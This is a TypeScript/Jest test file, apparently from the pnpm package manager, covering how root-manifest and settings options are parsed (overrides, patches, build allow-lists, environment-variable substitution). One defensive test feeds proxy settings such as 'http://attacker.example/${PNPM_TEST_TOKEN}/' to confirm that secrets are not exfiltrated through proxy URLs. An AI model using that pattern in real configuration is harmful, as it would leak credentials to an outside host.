import path from 'path'
import { getOptionsFromRootManifest, getOptionsFromPnpmSettings } from '../lib/getOptionsFromRootManifest.js'

const ORIGINAL_ENV = process.env

afterEach(() => {
  process.env = { ...ORIGINAL_ENV }
})

test('getOptionsFromRootManifest() should read "resolutions" field for compatibility with Yarn', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    resolutions: {
      foo: '1.0.0',
    },
  })
  expect(options.overrides).toStrictEqual({ foo: '1.0.0' })
})

test('getOptionsFromRootManifest() should read "overrides" field', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      overrides: {
        foo: '1.0.0',
      },
    },
  })
  expect(options.overrides).toStrictEqual({ foo: '1.0.0' })
})

test('getOptionsFromRootManifest() Support $ in overrides by dependencies', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    dependencies: {
      foo: '1.0.0',
    },
    pnpm: {
      overrides: {
        foo: '$foo',
      },
    },
  })
  expect(options.overrides).toStrictEqual({ foo: '1.0.0' })
})

test('getOptionsFromRootManifest() Support $ in overrides by devDependencies', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    devDependencies: {
      foo: '1.0.0',
    },
    pnpm: {
      overrides: {
        foo: '$foo',
      },
    },
  })
  expect(options.overrides).toStrictEqual({ foo: '1.0.0' })
})

test('getOptionsFromRootManifest() Support $ in overrides by dependencies and devDependencies', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    dependencies: {
      foo: '1.0.0',
    },
    devDependencies: {
      foo: '2.0.0',
    },
    pnpm: {
      overrides: {
        foo: '$foo',
      },
    },
  })
  expect(options.overrides).toStrictEqual({ foo: '1.0.0' })
})

test('getOptionsFromRootManifest() throws an error if cannot resolve an override version reference', () => {
  expect(() => getOptionsFromRootManifest(process.cwd(), {
    dependencies: {
      bar: '1.0.0',
    },
    pnpm: {
      overrides: {
        foo: '$foo',
      },
    },
  })).toThrow('Cannot resolve version $foo in overrides. The direct dependencies don\'t have dependency "foo".')
})

test('getOptionsFromRootManifest() should return onlyBuiltDependencies as undefined by default', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {})
  expect(options.onlyBuiltDependencies).toStrictEqual(undefined)
})

test('getOptionsFromRootManifest() should return the list from onlyBuiltDependencies', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      onlyBuiltDependencies: ['electron'],
    },
  })
  expect(options.onlyBuiltDependencies).toStrictEqual(['electron'])
})

test('getOptionsFromRootManifest() should derive allowUnusedPatches from allowNonAppliedPatches (legacy behavior)', () => {
  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: false,
    },
  })).toStrictEqual({
    allowUnusedPatches: false,
  })

  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: true,
    },
  })).toStrictEqual({
    allowUnusedPatches: true,
  })
})

test('allowUnusedPatches should override allowNonAppliedPatches', () => {
  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: false,
      allowUnusedPatches: false,
    },
  })).toStrictEqual({
    allowUnusedPatches: false,
  })

  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: true,
      allowUnusedPatches: false,
    },
  })).toStrictEqual({
    allowUnusedPatches: false,
  })

  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: false,
      allowUnusedPatches: false,
    },
  })).toStrictEqual({
    allowUnusedPatches: false,
  })

  expect(getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowNonAppliedPatches: true,
      allowUnusedPatches: false,
    },
  })).toStrictEqual({
    allowUnusedPatches: false,
  })
})

test('getOptionsFromRootManifest() should return patchedDependencies', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      patchedDependencies: {
        foo: 'foo.patch',
      },
    },
  })
  expect(options.patchedDependencies).toStrictEqual({ foo: path.resolve('foo.patch') })
})

test('getOptionsFromPnpmSettings() replaces env variables in settings', () => {
  process.env.PNPM_TEST_KEY = 'foo'
  process.env.PNPM_TEST_VALUE = 'bar'
  const options = getOptionsFromPnpmSettings(process.cwd(), {
    '${PNPM_TEST_KEY}': '${PNPM_TEST_VALUE}', // eslint-disable-line
  } as any) as any // eslint-disable-line
  expect(options.foo).toEqual('bar')
})

test('getOptionsFromPnpmSettings() ignores env variables inside registry setting', () => {
  process.env.PNPM_TEST_HOST = 'registry.example.com'
  const options = getOptionsFromPnpmSettings(process.cwd(), {
    registry: 'https://${PNPM_TEST_HOST}/npm/', // eslint-disable-line
  } as any) as any // eslint-disable-line
  expect(options.registry).toBeUndefined()
})

test('getOptionsFromPnpmSettings() ignores env variables inside proxy settings', () => {
  process.env.PNPM_TEST_TOKEN = 'secret'
  /* eslint-disable no-template-curly-in-string */
  const options = getOptionsFromPnpmSettings(process.cwd(), {
    httpsProxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
    httpProxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
    noProxy: '${PNPM_TEST_TOKEN}.example.com',
    proxy: 'http://attacker.example/${PNPM_TEST_TOKEN}/',
    noproxy: '${PNPM_TEST_TOKEN}.example.com',
  } as any) as any // eslint-disable-line
  /* eslint-enable no-template-curly-in-string */
  expect(options.httpsProxy).toBeUndefined()
  expect(options.httpProxy).toBeUndefined()
  expect(options.noProxy).toBeUndefined()
  expect(options.proxy).toBeUndefined()
  expect(options.noproxy).toBeUndefined()
  expect(JSON.stringify(options)).not.toContain('secret')
})

test('getOptionsFromPnpmSettings() keeps a registry setting without env placeholders', () => {
  const options = getOptionsFromPnpmSettings(process.cwd(), {
    registry: 'https://registry.example.com/npm/',
  } as any) as any // eslint-disable-line
  expect(options.registry).toBe('https://registry.example.com/npm/')
})

test('getOptionsFromRootManifest() converts allowBuilds', () => {
  const options = getOptionsFromRootManifest(process.cwd(), {
    pnpm: {
      allowBuilds: {
        foo: true,
        bar: false,
        qar: 'warn',
      },
    },
  })
  expect(options).toStrictEqual({
    onlyBuiltDependencies: ['foo'],
    ignoredBuiltDependencies: ['bar'],
  })
})
